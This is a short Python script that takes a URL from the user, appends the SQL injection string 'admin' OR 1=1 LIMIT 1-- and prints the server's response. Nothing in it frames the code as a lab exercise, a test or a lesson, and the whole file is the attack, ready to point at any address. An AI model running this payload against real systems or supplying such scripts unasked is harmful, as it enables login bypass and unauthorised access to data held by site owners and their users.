import requests

url = input("URL: ")
payload = "admin' OR 1=1 LIMIT 1--"

response = requests.get(url + payload)
print(response.text)
